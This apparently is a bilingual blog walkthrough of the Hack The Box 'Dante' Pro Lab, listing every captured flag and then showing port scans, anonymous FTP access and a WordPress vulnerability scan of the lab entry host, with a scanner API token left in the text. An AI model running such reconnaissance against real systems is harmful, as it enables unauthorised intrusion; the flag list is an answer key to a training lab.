---
title: HTB-Dante
description: 'Pro Labs-Dante'
pubDate: 2026-02-01
image: /Pro-Labs/dante.png
categories:
  - Documentation
  - Hackthebox Prolabs
tags:
  - Hackthebox
  - Pro-Labs
---

![](/Pro-Labs/dante.png)
# Flag
```c
root@DANTE-WEB-NIX01:/home/balthazar# cat /var/www/html/robots.txt
User-agent: Googlebot
User-agent: AdsBot-Google
Disallow: /wordpress
Disallow: DANTE{Y0u_Cant_G3t_at_m3_br0!}

root@DANTE-WEB-NIX01:/home/james# cat flag.txt 
DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}

root@DANTE-WEB-NIX01:~# cat flag.txt 
DANTE{Too_much_Pr1v!!!!}

margaret@172.16.1.10$ cat flag.txt
DANTE{LF1_M@K3s_u5_lol}

root@172.16.1.10# cd /root
root@172.16.1.10# cat flag.txt 
DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}

root@DANTE-NIX03:~# cat flag.txt 
cat flag.txt
DANTE{SH4RKS_4R3_3V3RYWHERE}

172.16.1.13
C:\Users\gerald\Desktop>type flag.txt
type flag.txt
DANTE{l355_t4lk_m04r_l15tening}

C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
DANTE{Bad_pr4ct1ces_Thru_strncmp}

172.16.1.12
+------------------------------+
| flag                         |
+------------------------------+
| DANTE{wHy_y0U_n0_s3cURe?!?!} |
+------------------------------+
    
ben@DANTE-NIX04:~$ cat flag.txt
DANTE{Pretty_Horrific_PH4IL!}

root@DANTE-NIX04:/root# cat flag.txt
DANTE{sudo_M4k3_me_@_Sandwich}

172.16.1.102
C:\Users\blake\Desktop>type flag.txt
type flag.txt
DANTE{U_M4y_Kiss_Th3_Br1d3}

C:\Users\Administrator\Desktop>
type flag.txt
DANTE{D0nt_M3ss_With_MinatoTW}

172.16.1.20
C:\Users\katwamba\Desktop>type flag.txt
type flag.txt
DANTE{Feel1ng_Blu3_or_Zer0_f33lings?}
C:>net user mrb3n
DANTE{1_jusT_c@nt_st0p_d0ing_th1s}

172.16.1.101
*Evil-WinRM* PS C:\Users\dharding\Documents> type ..\Desktop\flag.txt
DANTE{superB4d_p4ssw0rd_FTW}
C:\Users>type C:\Users\Administrator\Desktop\flag.txt
DANTE{Qu0t3_I_4M_secure!_unQu0t3}

172.16.1.5
ftp> get flag.txt
local: flag.txt remote: flag.txt
226 Successfully transferred "/flag.txt"
DANTE{Ther3s_M0r3_to_pwn_so_k33p_searching!}
C:\Users>type flag.txt
type flag.txt
DANTE{Mult1ple_w4Ys_in!}
C:\>type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\flag.txt
DANTE{Ju1cy_pot4t03s_in_th3_wild}

172.16.2.5
C:\Windows\system32> type "C:\Users\Administrator\Desktop\flag.txt"
DANTE{DC_or_Marvel?}
*Evil-WinRM* PS C:\> hostname; type C:\Users\jbercov\Desktop\flag.txt
DANTE-DC02
DANTE{Im_too_hot_Im_K3rb3r045TinG!}

172.16.1.19
DANTE{to_g0_4ward_y0u_mus7_g0_back}
debugfs:  cat /root/flag.txt
DANTE{g0tta_<3_ins3cur3_GROupz!}

172.16.2.101
# cat /root/flag.txt
DANTE{0verfl0wing_l1k3_craz33!}

172.16.2.6
julian@DANTE-ADMIN-NIX06:~$ cat flag.txt
DANTE{H1ding_1n_th3_c0rner}
root@DANTE-ADMIN-NIX06:~# cat flag.txt
DANTE{Alw4ys_check_th053_group5}

缓冲区溢出flag
DANTE{S0_Much_0vafl0z!}
```

# 入口信息收集
## IP信息
攻击机IP：10.10.16.80

入口IP: <u>10.10.110.0/24</u>

## rustscan扫描
```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# rustscan -a 10.10.110.100 --ulimit 5000 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.110.100:22
Open 10.10.110.100:21
Open 10.10.110.100:65000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 10.10.110.100
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-29 20:20 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
Initiating Ping Scan at 20:20
Scanning 10.10.110.100 [4 ports]
Completed Ping Scan at 20:20, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:20
Completed Parallel DNS resolution of 1 host. at 20:20, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:20
Scanning 10.10.110.100 [3 ports]
Discovered open port 65000/tcp on 10.10.110.100
Discovered open port 22/tcp on 10.10.110.100
Discovered open port 21/tcp on 10.10.110.100
Completed SYN Stealth Scan at 20:20, 0.38s elapsed (3 total ports)
Initiating Service scan at 20:20
Scanning 3 services on 10.10.110.100
Completed Service scan at 20:20, 12.25s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.110.100
Retrying OS detection (try #2) against 10.10.110.100
Initiating Traceroute at 20:20
Completed Traceroute at 20:20, 0.64s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 20:20
Completed Parallel DNS resolution of 2 hosts. at 20:20, 0.05s elapsed
DNS resolution of 2 IPs took 0.05s. Mode: Async [#: 3, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.110.100.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:20
NSE: [ftp-bounce 10.10.110.100:21] PORT response: 500 Illegal PORT command.
Completed NSE at 20:20, 12.29s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 3.72s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
Nmap scan report for 10.10.110.100
Host is up, received echo-reply ttl 62 (0.44s latency).
Scanned at 2026-01-29 20:20:09 EST for 41s

PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 62 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.80
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCtTLxLag6I25W/4MyXLNSNylWF6JL7BB9D/wK7yPZkTK0PX62N52x788lVBYZjuBvqN2wobnG5HMZvaneZaezpyi/bLGhdnERknUixrO6efcXebZFgJx5LyHENJpP5XxBpUdrczuM3/zBY1mpeBDWTMrJQLK31Sh/RxCNOlayM/DewYZmP8KCGnB0OR/BlR3dvtBOBdbuJQn+xoL6jbPjSQzTEFO/si2OwiIb0lW+PxC8RLIXulKav9k8wIFTZOqCICfnIGGIOg1LaUUtp/qt0csEQMDnCiTdgzFyi7m9yY6t8hZGCXMR8Z9RmbH8VuPbO8mRfMIxMda+rXmE8u0KUV2YW/ICeGNzle65o01YXzI4z/yzsj0HdANxMpzyYlSbNgIEo5yyGsnNHWBun3Vd5Px4QPwy//4X3od5tfi6W6XKHxK/ZFeT8nbGyoV47ozLxOFXYeTQ72RSYKENuFmn6VLyMH/C0JXFiwV5FNFqvJgmpEM9ba/3bDznTG0QUm48=
|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIVJJ8GPg11pc5bNU14qHtur8E0nGBUzMRB+9M+jdVF/l6+zNeA9aKzsCs/tT/46e7Qb9xhfSyRpSNDa/I49FOc=
|   256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAXEXWWafJIXJTRj8o05r1Ia4C++zzVfM7t+8MzY1cMj
65000/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=1/29%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=697C0772%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=107%TI=Z%II=I%TS=A)
OPS(O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11NW7%O6=M542ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 18.173 days (since Sun Jan 11 16:11:47 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 65000/tcp)
HOP RTT       ADDRESS
1   417.99 ms 10.10.16.1
2   626.98 ms 10.10.110.100

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.40 seconds
           Raw packets sent: 91 (7.688KB) | Rcvd: 36 (4.174KB)

```

```c
65000/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
```

![](/image/prolabs/Dante-1.png)

![](/image/prolabs/Dante-2.png)

# 10.10.110.100
## 22端口
### anonymous登录
```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# ftp anonymous@10.10.110.100
Connected to 10.10.110.100.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||17552|)
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Apr 14  2021 Transfer
226 Directory send OK.
```

输入指令然后卡住

####  1️⃣ `ls` 一会儿卡、一会儿超时 
```c
229 Entering Extended Passive Mode (|||17552|)
ftp: Can't connect to `10.10.110.100:17552': 连接超时 
```

👉 **原因：FTP 被动模式（PASV/EPSV）端口被防火墙挡了**

FTP 有两种数据连接方式：

| 模式 | 谁主动连 |
| --- | --- |
| 主动模式 (PORT) | 服务器连你 |
| 被动模式 (PASV / EPSV) | 你连服务器 |


你在 **Kali → 靶机**  
但靶机的 **被动端口（17552 / 54334）对你不可达**  
所以 `ls` 会卡 / 超时 / 偶尔成功。

+ FTP 在 **Docker / 内网**
+ 或者 **NAT / 多网卡**
+ **被动模式会炸**
+ **必须用 主动模式**

#### 2️⃣ `get Transfer` 失败
```plain
get Transfer
550 Failed to open file.
```

👉 **Transfer 是目录，不是文件**

FTP 的 `get` 只能下载 **文件**，不能下载 **目录**

##### FTP中如何判断目录或文件
** 看 **`**ls / dir**`** 的第一列**

```c
ftp> ls
drwxr-xr-x    4 0        0            4096 Apr 14  2021 Transfer
-rw-r--r--    1 0        0             123 Apr 14  2021 note.txt
```

##### 🔍 第一列含义（记住这个就够了）
| 开头字符 | 含义 |
| --- | --- |
| `d` | 📁 **目录 (directory)** |
| `-` | 📄 **普通文件** |
| `l` | 🔗 符号链接 |
| `c` | 字符设备 |
| `b` | 块设备 |


#### ✅ 切换到「主动模式」（强烈推荐）
**在 **`**ftp>**`** 里执行：**

```plain
passive off
```

**然后再试：**

```plain
ls
cd Transfer
ls
```

💡** Kali → 靶机，主动模式通常更稳**

### 下载todo.txt
```c
ftp> passive off
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             310 Aug 04  2020 todo.txt
226 Directory send OK.
ftp> get todo.txt
local: todo.txt remote: todo.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for todo.txt (310 bytes).
100% |***********|   310        5.57 MiB/s    00:00 ETA
226 Transfer complete.
310 bytes received in 00:00 (0.69 KiB/s)
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# cat todo.txt 
- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS

- 完成 WordPress 权限变更 —— 待处理
- 在切换到 80 端口之前，更新链接以使用 DNS 名称 —— 待处理
- 移除另一个站点中的 LFI 漏洞 —— 待处理
- 将 James 的密码重置为更安全的密码 —— 待处理
- 在初级渗透测试员评估之前对系统进行加固 —— 进行中
```

## 65000端口
### wpscan
```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# wpscan --url http://10.10.110.100:65000/wordpress/ --api-token "NEzNxgvCrcyIZN1aYoHxHyUda29vcAIcsbaCrFngLA0" 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
[+] Started: Thu Jan 29 20:31:57 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |
 | [!] 50 vulnerabilities identified:
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS in Block Editor
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/831e4a94-239c-4061-b66e-f5ca0dbb84fa
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4046
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rpwf-hrh2-39jf
 |      - https://pentest.co.uk/labs/research/subtle-stored-xss-wordpress-core/
 |      - https://www.youtube.com/watch?v=tCh7Y8z8fb4
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/741d07d1-2476-430a-b82f-e1228a9343a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4047
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8q2w-5m27-wm27
 |
 | [!] Title: WordPress < 5.4.2 - Open Redirection
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/12855f02-432e-4484-af09-7d0fbf596909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4048
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/10e2a50c523cf0b9785555a688d7d36a40fbeccf
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-q6pw-gvf4-5fj5
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated Stored XSS via Theme Upload
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/d8addb42-e70b-4439-b828-fd0697e5d9d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4049
 |      - https://www.exploit-db.com/exploits/48770/
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-87h4-phjv-rm6p
 |      - https://hackerone.com/reports/406289
 |
 | [!] Title: WordPress < 5.4.2 - Misuse of set-screen-option Leading to Privilege Escalation
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/b6f69ff1-4c11-48d2-b512-c65168988c45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4050
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/dda0ccdd18f6532481406cabede19ae2ed1f575d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4vpv-fgg2-gcqc
 |
 | [!] Title: WordPress < 5.4.2 - Disclosure of Password-Protected Page/Post Comments
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/eea6dbf5-e298-44a7-9b0d-f078ad4741f9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25286
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c075eec24f2f3214ab0d0fb0120a23082e6b1122
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     Fixed in: 5.4.5
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 5.4.6
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5
 |
 | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/5b754676-20f5-4478-8fd3-6bc383145811
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v
 |
 | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/5d6789db-e320-494b-81bb-e678674f4199
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/lodash/lodash/wiki/Changelog
 |      - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689
 |
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 |     Fixed in: 5.4.8
 |     References:
 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
 |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/54207
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 5.4.10
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     Fixed in: 5.4.11
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 5.4.11
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     Fixed in: 5.4.11
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
